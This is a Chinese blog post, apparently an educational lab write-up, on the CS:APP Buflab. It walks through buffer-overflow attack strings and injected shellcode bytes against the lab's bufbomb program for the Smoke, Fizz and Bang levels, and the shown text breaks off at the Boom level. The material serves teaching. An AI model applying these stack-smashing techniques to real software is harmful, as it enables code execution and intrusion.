@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="zhwhong" />
+
+
+
+<meta name="description" content="任务说明书：[pdf] buflab | http://csapp.cs.cmu.edu/public/labs.html
+数据包下载：buflab-handout.tar
+实验源码：zhwhong/Bufbomb_CSAPP
+同步简书：Bufbomb缓冲区溢出攻击实验详解-zhwhong">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bufbomb缓冲区溢出攻击实验详解-CSAPP">
+<meta property="og:url" content="http://zhwhong.ml/2017/05/29/buffer-overflow-attack/index.html">
+<meta property="og:site_name" content="Zhiwei's Blog">
+<meta property="og:description" content="任务说明书：[pdf] buflab | http://csapp.cs.cmu.edu/public/labs.html
+数据包下载：buflab-handout.tar
+实验源码：zhwhong/Bufbomb_CSAPP
+同步简书：Bufbomb缓冲区溢出攻击实验详解-zhwhong">
+<meta property="og:image" content="http://zhwhong.ml/1.png">
+<meta property="og:image" content="http://zhwhong.ml/2.png">
+<meta property="og:image" content="http://zhwhong.ml/3.png">
+<meta property="og:image" content="http://zhwhong.ml/4.png">
+<meta property="og:image" content="http://zhwhong.ml/1.png">
+<meta property="og:image" content="http://zhwhong.ml/5.png">
+<meta property="og:image" content="http://zhwhong.ml/6.png">
+<meta property="og:image" content="http://zhwhong.ml/7.png">
+<meta property="og:image" content="http://zhwhong.ml/8.png">
+<meta property="og:image" content="http://zhwhong.ml/9.png">
+<meta property="og:image" content="http://zhwhong.ml/10.png">
+<meta property="og:image" content="http://zhwhong.ml/11.png">
+<meta property="og:image" content="http://zhwhong.ml/12.png">
+<meta property="og:image" content="http://zhwhong.ml/13.png">
+<meta property="og:image" content="http://zhwhong.ml/14.png">
+<meta property="og:image" content="http://zhwhong.ml/15.png">
+<meta property="og:image" content="http://zhwhong.ml/16.png">
+<meta property="og:image" content="http://zhwhong.ml/17.png">
+<meta property="og:image" content="http://zhwhong.ml/18.png">
+<meta property="og:image" content="http://zhwhong.ml/19.png">
+<meta property="og:image" content="http://zhwhong.ml/20.png">
+<meta property="og:image" content="http://zhwhong.ml/21.png">
+<meta property="og:image" content="http://zhwhong.ml/22.png">
+<meta property="og:image" content="http://zhwhong.ml/23.png">
+<meta property="og:image" content="http://zhwhong.ml/24.png">
+<meta property="og:image" content="http://zhwhong.ml/25.png">
+<meta property="og:updated_time" content="2017-05-29T12:08:19.699Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bufbomb缓冲区溢出攻击实验详解-CSAPP">
+<meta name="twitter:description" content="任务说明书：[pdf] buflab | http://csapp.cs.cmu.edu/public/labs.html
+数据包下载：buflab-handout.tar
+实验源码：zhwhong/Bufbomb_CSAPP
+同步简书：Bufbomb缓冲区溢出攻击实验详解-zhwhong">
+<meta name="twitter:image" content="http://zhwhong.ml/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Zhiwei&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Bufbomb缓冲区溢出攻击实验详解-CSAPP | Zhiwei&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?d56e3e389de0eb071ac9b56b7d5f66c1";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">zhwhong</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Stay Hungry Stay Foolish | 常葆求知若饥 常存虚怀若愚</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章归档</a></li>
+                        
+                            <li><a href="/tags/">分类标签</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa Email" href="mailto:hongzhiwei886@gmail.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/zhwhong" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="//github.com/zhwhong" title="GitHub"></a>
+                            
+                                <a class="fa Facebook" href="https://www.facebook.com/profile.php?id=100008115764524" title="Facebook"></a>
+                            
+                                <a class="fa 简书" href="http://www.jianshu.com/u/38cd2a8c425e" title="简书"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/zhwhong/activities" title="知乎"></a>
+                            
+                                <a class="fa 豆瓣" href="https://www.douban.com/people/zhwhong/" title="豆瓣"></a>
+                            
+                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=49576672" title="网易云音乐"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AUC/">AUC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithm/">Algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Buflab/">Buflab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CNN/">CNN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Caffe/">Caffe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Classfication/">Classfication</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Computer-System/">Computer System</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Computer-Vision/">Computer Vision</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Debug/">Debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Deep-Learning/">Deep Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dicom/">Dicom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GNU/">GNU</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GPU/">GPU</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IA-32/">IA-32</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LIDC/">LIDC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LSTM/">LSTM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Makefile/">Makefile</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Music/">Music</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Neural-Network/">Neural Network</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Object-Detection/">Object Detection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RNN/">RNN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROC/">ROC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/TensorFlow/">TensorFlow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Theme/">Theme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xml/">Xml</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://scholar.google.com/">Google scholar</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://csrankings.org/?nsukey=eDYw1JlrTACtiYA%2BUn%2FlPzeKi7tH23c2yYScMmTD1d4O%2FM5MSONsPUiIwGeKGX5bfZSEDyKi0rIQS80brHuAVnx%2FJhlnzTuzAvY9ePyy5tnxNaVWdu3owBicjNIFvxJG9HFXi1kAsN0U2%2BLeGLXA3HBznVmKhbu1Vw6UBjQ%2FqqwQ95bobndqgpqO8OtwePuV">CS Rankings (beta)</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://karpathy.github.io/2016/09/07/phd/">A Survival Guide to a PhD - karpathy</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://zhuanlan.zhihu.com/p/25099638">博士这五年 - 李沐</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://arxiv.org/">arXiv.org</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.arxiv-sanity.com/">Arxiv Sanity Preserver</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一只 Deep Learning, Data Mining, Bioinformatics 的CS小菜鸟(*´∇｀*), 欢迎分享知识。喜欢音乐、影视、阅读，爱好乒乓球、健身、户外，喜欢捣腾电脑blabla (●’◡’●)</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">zhwhong</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">zhwhong</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Stay Hungry Stay Foolish | 常葆求知若饥 常存虚怀若愚</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章归档</a></li>
+                
+                    <li><a href="/tags/">分类标签</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hongzhiwei886@gmail.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/zhwhong" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="//github.com/zhwhong" title="GitHub"></a>
+                            
+                                <a class="fa Facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100008115764524" title="Facebook"></a>
+                            
+                                <a class="fa 简书" target="_blank" href="http://www.jianshu.com/u/38cd2a8c425e" title="简书"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/zhwhong/activities" title="知乎"></a>
+                            
+                                <a class="fa 豆瓣" target="_blank" href="https://www.douban.com/people/zhwhong/" title="豆瓣"></a>
+                            
+                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=49576672" title="网易云音乐"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-buffer-overflow-attack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/05/29/buffer-overflow-attack/" class="article-date">
+      <time datetime="2017-05-29T11:28:31.000Z" itemprop="datePublished">2017-05-29</time>
+</a>
+
+ 
+    <a href="/2017/05/29/buffer-overflow-attack/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+            <span class="ds-thread-count" ></span>
+        
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Bufbomb缓冲区溢出攻击实验详解-CSAPP
+    </h1>
+  
+
+        
+            <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">4,378字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">18分</span>
+      </span>
+    </span>
+</div>
+    <!-- <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+        <span class="post-meta-item-text">  阅读量: </span>
+        <span id="busuanzi_value_page_pv"></span>次
+      </span>
+    </span> -->
+
+        
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+          <br>
+          <br>
+        
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Linux/">Linux<span class="article-category-count">3</span></a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Buflab/">Buflab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Computer-System/">Computer System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IA-32/">IA-32</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <script src="/assets/js/APlayer.min.js"> </script><ul>
+<li>任务说明书：<a href="https://github.com/zhwhong/Bufbomb_CSAPP/blob/master/buflab.pdf" target="_blank" rel="external">[pdf] buflab</a> | <a href="http://csapp.cs.cmu.edu/public/labs.html" target="_blank" rel="external">http://csapp.cs.cmu.edu/public/labs.html</a></li>
+<li>数据包下载：<a href="https://github.com/zhwhong/Bufbomb_CSAPP/blob/master/buflab-handout.tar" target="_blank" rel="external">buflab-handout.tar</a></li>
+<li>实验源码：<a href="https://github.com/zhwhong/Bufbomb_CSAPP" target="_blank" rel="external">zhwhong/Bufbomb_CSAPP</a></li>
+<li>同步简书：<a href="http://www.jianshu.com/p/dc41c84cef17" target="_blank" rel="external">Bufbomb缓冲区溢出攻击实验详解</a>-<a href="http://www.jianshu.com/u/38cd2a8c425e" target="_blank" rel="external">zhwhong</a></li>
+</ul>
+<a id="more"></a>
+<hr>
+<h2 id="实验概述"><a href="#实验概述" class="headerlink" title="实验概述"></a>实验概述</h2><p>　　本<a href="https://github.com/zhwhong/Bufbomb_CSAPP/blob/master/buflab.pdf" target="_blank" rel="external">实验</a>的目的在于加深对IA-32函数调用规则和栈结构的具体理解。实验的主要内容是对一个可执行程序“bufbomb”实施一系列缓冲区溢出攻击（buffer overflow attacks），也就是设法通过造成缓冲区溢出来改变该可执行程序的运行内存映像，继而执行一些原来程序中没有的行为，例如将给定的字节序列插入到其本不应出现的内存位置等。本次实验需要你熟练运用gdb、objdump、gcc等工具完成。</p>
+<p>　　实验中你需要对目标可执行程序BUFBOMB分别完成5个难度递增的缓冲区溢出攻击。5个难度级分别命名为 <strong>Smoke</strong>（level 0）、<strong>Fizz</strong>（level 1）、<strong>Bang</strong>（level 2）、<strong>Boom</strong>（level 3）和 <strong>Nitro</strong>（level 4），其中Smoke级最简单而Nitro级最困难。</p>
+<p>　　实验语言：c；实验环境：linux。</p>
+<h2 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h2><p>　　本实验的数据包含于一个文件包<strong>buflab-handout.tar [1.06M]</strong> 中，可以从<a href="https://github.com/zhwhong/Bufbomb_CSAPP/blob/master/buflab-handout.tar" target="_blank" rel="external"><strong>这里</strong></a>下载。下载该文件到本地目录中，然后利用“<code>tar –xvf buflab-handout.tar</code>”命令将其解压，至少包含下列四个文件：</p>
+<ul>
+<li><strong>bufbomb</strong>：实验需要攻击的目标程序bufbomb。</li>
+<li><strong>bufbomb.c</strong>：目标程序bufbomb的主源程序。</li>
+<li><strong>makecookie</strong>：该程序基于你的学号产生一个唯一的由8个16进制数字组成的4字节序列（例如0x5f405c9a），称为“cookie”。</li>
+<li><strong>hex2raw</strong>：字符串格式转换程序。</li>
+</ul>
+<p>　　另一个需要的文件是，用objdump工具反汇编bufbomb可执行目标程序，得到它的反汇编源程序，在后面的分析中，你将要从这个文件中查找很多信息。</p>
+<p><strong>（注：更多详细信息说明请见<a href="https://github.com/zhwhong/Bufbomb_CSAPP/blob/master/buflab.pdf" target="_blank" rel="external">任务说明书</a>.）</strong></p>
+<h2 id="实验步骤及操作说明"><a href="#实验步骤及操作说明" class="headerlink" title="实验步骤及操作说明"></a>实验步骤及操作说明</h2><p>　　本实验需要你构造一些攻击字符串，对目标可执行程序BUFBOMB分别造成不同的缓冲区溢出攻击。实验分5个难度级分别命名为Smoke（level 0）、Fizz（level 1）、Bang（level 2）、Boom（level 3）和Nitro（level 4）。</p>
+<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>　　本次lab利用getbuf()方程不检查读取string长度的漏洞破坏该方程的return address从而达到对主程序造成破坏的目的。从getbuf() 的assembly code我们可以看到：</p>
+<p><img src="1.png" alt=""></p>
+<p>位于<0x80490a3> 地址处代码为预读的string在stack创建了0x28(也就是40)个Byte 的空间。具体位置可以通过gdb在下一行设置breakpoint 查找 %eax 的值得到，如下所示：</0x80490a3></p>
+<p><img src="2.png" alt=""></p>
+<p>通过gdb调试得到，getbuf()申请的40字节缓冲区首地址为 <strong><0x55683438></0x55683438></strong>，这个地址后面会用到。</p>
+<p>通常在P过程调用Q过程时，程序的stack frame结构如下图所示：</p>
+<p><img src="3.png" alt=""></p>
+<p>为了覆盖被存在Return Address上的值(4 Bytes for m32 machine)，我们需要读入超过系统默认40 Bytes大小的string。由于Saved ebp 占据了4 Bytes 所以当我们的input string 为48 Bytes时，最后4位Bytes 刚好覆盖我们的目标Return address.</p>
+<p><strong>Notes:</strong> 由于我们在输入文件下写入的都是character（字符）因此我们需要利用hex2raw这个小程序帮助我们将我们写入的character转换成所对应的二进制数列。</p>
+<h3 id="level0-Smoke"><a href="#level0-Smoke" class="headerlink" title="level0:Smoke"></a>level0:Smoke</h3><p>Smoke任务的目标是构造一个攻击字符串作为bufbomb的输入，在getbuf()中造成缓冲区溢出，使得getbuf()返回时不是返回到test函数，而是转到smoke函数处执行。为此，你需要：</p>
+<h4 id="1-在bufbomb的反汇编源代码中找到smoke函数，记下它的起始地址："><a href="#1-在bufbomb的反汇编源代码中找到smoke函数，记下它的起始地址：" class="headerlink" title="1. 在bufbomb的反汇编源代码中找到smoke函数，记下它的起始地址："></a>1. 在bufbomb的反汇编源代码中找到smoke函数，记下它的起始地址：</h4><p><img src="4.png" alt=""></p>
+<p>如以上实例中，smoke的开始地址是<strong><0x08048b50></0x08048b50></strong> 。</p>
+<h4 id="2-同样在bufbomb的反汇编源代码中找到getbuf-函数，观察它的栈帧结构："><a href="#2-同样在bufbomb的反汇编源代码中找到getbuf-函数，观察它的栈帧结构：" class="headerlink" title="2. 同样在bufbomb的反汇编源代码中找到getbuf()函数，观察它的栈帧结构："></a>2. 同样在bufbomb的反汇编源代码中找到getbuf()函数，观察它的栈帧结构：</h4><p><img src="1.png" alt=""></p>
+<p>如以上实例，你可以看到getbuf()的栈帧是0x38+4个字节，而buf缓冲区的大小是0x28（40个字节）。</p>
+<h4 id="3-构造攻击字符串覆盖返回地址"><a href="#3-构造攻击字符串覆盖返回地址" class="headerlink" title="3. 构造攻击字符串覆盖返回地址"></a>3. 构造攻击字符串覆盖返回地址</h4><p>　　攻击字符串的功能是用来覆盖getbuf函数内的数组buf(缓冲区)，进而溢出并覆盖%ebp和%ebp上面的返回地址，所以攻击字符串的大小应该是<strong>0x28+4+4=48</strong>个字节。并且其最后4个字节应是smoke函数的地址，正好覆盖%ebp上方的正常返回地址。这样再从getbuf返回时，取出的根据攻击字符串设置的地址，就可实现控制转移。</p>
+<p>所以，这样的攻击字符串为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">50 8b 04 08</div></pre></td></tr></table></figure>
+<p>总共48个字节，并且前面44个字节可以为任意值，对程序的执行没有任何影响，只要最后四个字节正确地设置为smoke的起始地址<strong><0x08048b50></0x08048b50></strong> 即可，对应内存写入<code>50 8b 04 08</code>（小端格式）。</p>
+<p>可以将上述攻击字符串写在攻击字符串文件中，命名为<strong>smoke_U201315075.txt</strong>，之后通过hex2raw处理过滤掉所有的注释，还原成没有任何冗余数据的攻击字符串原始数据而代入bufbomb中使用。通过Linux终端执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat smoke_U201315075.txt |./hex2raw |./bufbomb -u U201315075</div></pre></td></tr></table></figure>
+<p>显示结果如下：</p>
+<p><img src="5.png" alt=""></p>
+<p>至此，level0任务smoke通过！</p>
+<h3 id="level1-fizz"><a href="#level1-fizz" class="headerlink" title="level1:fizz"></a>level1:fizz</h3><p>level1 和 level0 大同小异，唯一的区别是本次要求跳入函数 fizz(int) 且该函数有一个参数(要求用所给cookie作argument)。</p>
+<p>我们知道在执行完ret指令后栈顶指针 %esp 会自动增加4以还原栈帧。</p>
+<p>通过查找fizz()得知：</p>
+<p><img src="6.png" alt=""></p>
+<ul>
+<li>fizz()函数的起始地址为<strong><0x08048b7a></0x08048b7a></strong> 。</li>
+<li>由Overview里面的栈帧图示可知，ebp存放了调用者的旧ebp（saved %ebp），其上一位置ebp+4存放了调用者的返回地址，所以参数的地址应该为<strong>ebp+8</strong>的位置，我们只需要将自己的cookie放置在该位置即可。</li>
+</ul>
+<p>所以构造攻击文件<strong>fizz_U201315075.txt</strong>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">7a 8b 04 08</div><div class="line">00 00 00 00</div><div class="line">26 05 8f 2d</div></pre></td></tr></table></figure>
+<p>其中，<strong><0x08058b7a></0x08058b7a></strong> 为fizz函数起始地址，<strong>0x2d8f0526</strong> 为自己的cookie，通过参数传递给fizz。</p>
+<p>最后执行测试结果如下：</p>
+<p><img src="7.png" alt=""></p>
+<p>至此，level1任务fizz通过！</p>
+<h3 id="level2-bang"><a href="#level2-bang" class="headerlink" title="level2:bang"></a>level2:bang</h3><p>level2的难度开始增加，除了需要跳转至目标函数bang() 地址为<strong><0x08048bc5></0x08048bc5></strong> ：</p>
+<p><img src="8.png" alt=""></p>
+<p>我们还需要执行一些自行设计的指令，因为该任务我们需要将global_value 的值改成我们的cookie，通过<code>objdump -D bufbomb | less</code> (注意D要大写我们才能看到header的代码， <code>-d</code>不会显示)：</p>
+<p><img src="9.png" alt=""></p>
+<p>通过objdump -D 反汇编可以看到：</p>
+<ul>
+<li>global_value的地址是<strong><0x0804d100></0x0804d100></strong> ， 目前该位置的初始值为 0 ；</li>
+<li>cookie的地址是<strong><0x0804d108></0x0804d108></strong> ， 目前该位置的值初始为 0，程序运行后会变为cookie的值。</li>
+</ul>
+<p>我们需要做的就是，在程序运行时将<strong>global_value</strong>的值设置为cookie的值。</p>
+<p>构造自定义攻击指令<strong>bang.s</strong>：</p>
+<p><img src="10.png" alt=""></p>
+<p>由于是Assembly code 不需要考虑 little endian的问题。先将global_value 用mov指令变cookie (<strong>0x0804d100</strong> 前不加$ 表示地址)，然后将bang()函数地址<strong><0x08048bc5></0x08048bc5></strong> 写给esp，再执行ret指令时，程序自动跳入bang()函数。</p>
+<p>指令 <strong>gcc -m32 -c bang.s</strong> 将assembly code写成machine code –&gt;bang.o，再用<strong>objdump -d bang.o</strong> 读取machine code如下：</p>
+<p><img src="11.png" alt=""></p>
+<p>将指令代码抄入攻击文件，除此之外我们还需要找到input string存放的位置作为第一次ret 指令的目标位置，具体操作方法见Overview， 经过gdb调试分析getbuf()申请的40字节缓冲区首地址为<strong><0x55683438></0x55683438></strong> 。</p>
+<p>所以构造攻击字符串<strong>bang_U201315075.txt</strong>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">c7 05 00 d1</div><div class="line">04 08 26 05</div><div class="line">8f 2d 68 c5</div><div class="line">8b 04 08 c3</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">38 34 68 55</div></pre></td></tr></table></figure>
+<p>最后执行测试结果如下：</p>
+<p><img src="12.png" alt=""></p>
+<p>至此，level2任务bang通过！</p>
+<h3 id="level3-bomb"><a href="#level3-bomb" class="headerlink" title="level3:bomb"></a>level3:bomb</h3><p>不同于之前跳入其他函数，在本任务中我们希望getbuf() 结束后回到test()原本的位置（即call getbuf后的下一行），并将你的cookie作为getbuf()的返回值传给test()。为了使攻击更加具有迷惑性我们还希望saved ebp被复原，这样一来原程序就完全不会因为外部攻击而出错崩溃，也就是退出攻击后要保证栈空间还原，使test()察觉不到我们干了什么，就好像我们什么都没做一样。</p>
